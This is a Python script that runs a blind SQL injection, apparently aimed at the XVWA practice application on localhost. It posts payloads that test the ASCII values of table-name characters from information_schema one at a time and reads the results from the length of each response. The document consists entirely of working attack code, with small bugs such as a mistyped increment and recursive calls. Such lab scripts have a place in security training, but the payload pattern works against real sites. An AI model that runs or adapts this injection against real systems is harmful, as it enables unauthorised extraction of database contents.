import requests

column_name = []
character_position = 1

#in my case all letters were lower case, but adjust as needed
def findTheChar():
    for i in range(97,123):
        table_letter = hex(i)
        global character_position
        url = "http://localhost:9090/xvwa/vulnerabilities/sqli_blind/"
        mydata = {
            "item": "",
            "search" : "' AND ascii(substring((Select table_name from information_schema.tables where table_schema='xvwa' limit 0,1)," + str(character_position) + ",1))>" + table_letter + " UNION SELECT 1,2,3,4,5,6,7-- -"
        }
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" : "ca,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding" : "gzip, deflate",
            "Content-Type" : "application/x-www-form-urlencoded",
        }

        x = requests.post(url, headers=headers, data=mydata)
        print(len(x.text))
        if len(x.text) > 17000:
            print("[-] Letter " + chr(i) + " is higher than the character")
        else:
            column_name.append(chr(i))
            character_position += 1
            print("[+] Letter " + chr(i) + " is not higher than the character")
            print(column_name)
            main()

def main():
    character_position =+ 1
    findTheChar()

main()
